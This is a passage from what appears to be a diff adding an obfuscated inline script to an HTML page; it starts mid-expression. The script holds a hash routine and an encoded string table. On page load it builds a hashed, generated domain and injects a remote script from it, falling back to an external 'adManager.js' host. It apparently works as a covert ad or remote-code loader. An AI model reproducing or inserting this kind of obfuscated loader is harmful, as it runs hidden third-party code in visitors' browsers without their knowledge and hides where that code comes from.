3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
